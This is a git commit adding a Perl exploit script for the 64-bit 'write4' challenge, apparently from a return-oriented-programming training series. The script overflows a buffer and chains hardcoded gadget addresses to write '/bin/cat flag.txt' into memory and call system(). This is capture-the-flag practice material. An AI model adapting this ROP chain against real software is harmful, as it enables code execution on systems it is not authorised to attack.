9ea995fe99cb55218ac3677fe00d8d40a68f27cd
cahu <cahu@nowhere.net>
2017-09-23 22:32:05 +0200

    write4 64bits

---
+++ write4/solution_64.pl
@@ -0,0 +1,31 @@
+$PADDING  = "B"x40;
+$BSS      = "\x60\x10\x60\x00" . "\0"x4; # BSS section
+$CALLSYS  = "\x10\x08\x40\x00" . "\0"x4; # call to system() in 'usefulFunction'
+$SETREGS  = "\x90\x08\x40\x00" . "\0"x4; # gagdget that pops into r14 and r15
+$POPRDI   = "\x93\x08\x40\x00" . "\0"x4; # gadget 'pop rdi; ret'
+$WRITEMEM = "\x20\x08\x40\x00" . "\0"x4; # 'usefulGadgets'
+
+sub write_bytes
+{
+	my ($addr, $string) = @_;
+
+	my $mod = (length $string) % 8;
+	if ($mod ne 0) {
+		$string .= "\x00" x (8 - $mod);
+	}
+
+	my $rop = "";
+	for my $str (unpack("(a8)*", $string))
+	{
+		$rop  .= $SETREGS . pack("Q", $addr) . $str . $WRITEMEM;
+		$addr += 8;
+	}
+
+	$rop;
+}
+
+print $PADDING
+	. write_bytes(0x601060, "/bin/cat flag.txt\0")
+	. $POPRDI
+	. $BSS
+	. $CALLSYS;
